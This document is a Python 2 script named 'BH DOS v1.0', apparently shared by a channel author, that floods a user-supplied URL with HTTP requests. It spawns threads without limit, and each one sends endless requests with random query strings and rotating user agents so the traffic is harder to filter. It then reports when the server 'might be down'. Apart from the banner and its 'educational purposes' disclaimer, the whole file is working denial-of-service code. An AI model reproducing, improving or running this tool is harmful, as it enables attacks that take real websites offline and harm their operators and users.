import os
import sys
import urllib2
import threading
import random

#Subscribe to my Channel
#Johnix PH

if sys.platform == "linux" or sys.platform == "linux2":
    os.system("clear")
elif sys.platform == "win32":
    os.system("cls")

print ("\033[1;32m")

print ("====================================")
print ("                             BH DOS v1.0                             ")
print ("                    Programmed by Johnix PH.               ")
print ("                 USE THIS AT YOUR OWN RISK")
print ("     USE THIS FOR EDUCATIONAL PURPOSES")
print ("====================================")

url = raw_input("Enter the URL >>   ").strip()
print ("\033[1;m")

count = 0
headers = []
referer = {
    "https://duckduckgo.com/",
    "https://www.google.com/",
    "https://www.youtube.com"
}


def useragent():
    global headers
    headers.append("Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; RM-1152)")
    headers.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)")
    headers.append("Mozilla/5.0 (Linux; Android 6.0.1; SM-G920V Build/MMB29K) AppleWebKit/537.36")
    headers.append("Mozilla/5.0 (Windows; U; Windows NT 5.0; es-ES; rv:1.8.0.3) Gecko/20060426 Firefox/1.5.0.3")

    return headers


def ascii(size):
    out_str = ''

    for e in range(0, size):
        code = random.randint(65, 90)
        out_str += chr(code)
    
    return out_str


class httpth1(threading.Thread):
    def run(self):
        global count
        while True:
            try:
                #print ("\033[1;32m Hammering the Website \033[1;m")
                req = urllib2.Request(url + "?" + ascii(random.randint(3, 10)))
                #req = urllib2.Request(url)
                req.add_header("User-Agent", random.choice(useragent()))
                #req.add_header("User-Agent", "Mozilla/5.0 (Windows; U; Windows NT 5.0; es-ES; rv:1.8.0.3) Gecko/20060426 Firefox/1.5.0.3")
                req.add_header("Referer", referer)
                urllib2.urlopen(req)
                count += 1
                print ("{0} XDos Send".format(count))
            except urllib2.HTTPError:
                print ("\033[1;34m !!!SERVER MIGHT ME DOWN!!! \033[1;m")
                pass
            except urllib2.URLError:
                print ("\033[1;34m URL_ERROR \033[1;m")
                sys.exit()
            except ValueError:
                print ("\033[1;34m [-]  Hammering URL  \033[1;m")
                sys.exit()
            except KeyboardInterrupt:
                exit("\033[1;34m [-]Aborted By User \033[1;m")
                sys.exit()


while True:
    try:
        th1 = httpth1()
        th1.start()
    except Exception:
        pass
    except KeyboardInterrupt:
        exit("\033[1;34m [-]Aborted By User \033[1;m")
